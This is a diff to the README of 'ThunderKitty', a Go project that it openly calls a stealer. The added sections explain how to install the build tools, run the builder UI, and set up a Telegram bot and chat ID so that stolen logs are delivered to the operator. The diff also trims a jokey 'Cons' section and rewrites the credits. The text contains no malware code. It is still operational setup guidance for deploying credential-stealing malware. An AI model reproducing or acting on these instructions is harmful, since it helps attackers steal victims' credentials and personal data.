@@ -5,7 +5,6 @@
 ![ThunderKitty Logo](https://github.com/EvilBytecode/ThunderKitty/assets/151552809/3c98bcf2-b958-48ae-8c5a-c8a0be13abd4)
 
 ---
----
 
 ## Current Features
 
@@ -38,12 +37,25 @@
 - Changes Wallpaper
 - Text-to-speech upon execution
 
----
+## Installation & Setup
+### Pre-requisites:
+- [The Go Programming Language](https://go.dev)
+- [GCC/MinGW-w64](https://www.mingw-w64.org/)
+- For help on installing MinGW-w64, consult [this link](https://code.visualstudio.com/docs/cpp/config-mingw).
 
-# Cons
+### Building
+- If you are building from source, you must run the following commands in your terminal.
+- ```set CGO=1```
+- ```go run main_gui.go```
+- This command might take a few minutes as Go has to install packages such as Fyne, which are quite large.
+- Once it finishes building, you will be presented with the builder UI and you will be able to proceed.
 
-- Best grabber 🤣
-- Discord :x: (Discord will terminate your account now.)
+### Creating a Telegram Bot
+- As this stealer uses Telegram for delivery of logs, you are required to create a bot.
+- The first thing you must do is message [BotFather](https://t.me/botfather) and create a new bot.
+- Once you have the bot created, message [chatIDrobot](https://t.me/chatIDrobot) to receive your chat ID.
+- You can then put both of these values in the builder.
+- Don't forget to start a conversation with the bot you just created, as you won't be able to receive messages otherwise.
 
 ---
 
@@ -56,5 +68,6 @@
 
 ## Credits
 
-- [hackirby](https://github.com/hackirby) (For Base, wouldn't be recoding all that sh from ground lol.)
-- Muza for help with Telegram Sending (never really used Telegram before, so he carried)
+- [hackirby](https://github.com/hackirby) - Providing the base for the stealer.
+- Muza - Providing help with Telegram message sending. (Never really used Telegram before, so he carried)
+- [SecDbg](https://github.com/secdbg) - Contributing heavily to development.
